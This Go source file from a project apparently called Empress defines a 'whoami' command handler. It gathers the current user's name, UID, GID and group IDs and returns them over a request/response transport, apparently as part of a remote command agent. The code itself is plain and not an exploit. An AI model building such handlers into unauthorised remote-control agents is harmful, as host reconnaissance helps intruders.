package system

import (
	"github.com/pygrum/Empress/transport"
	"os/user"
	"strings"
)

func CmdWhoami(_ *transport.Request, response *transport.Response) {
	u, err := user.Current()
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	//User.GroupIds now uses a Go native implementation when cgo is not available.
	// https://tip.golang.org/doc/go1.18
	id := u.Name + "\n" + u.Username + "\nUID: " + u.Uid + "\nGID: " + u.Gid + "\nGroups: "
	groupString := ""
	groups, err := u.GroupIds()
	if err != nil {
		groupString = err.Error()
	} else {
		groupString = strings.Join(groups, ", ")
	}
	id += groupString
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestStdout,
		Data:   []byte(id),
	})
}
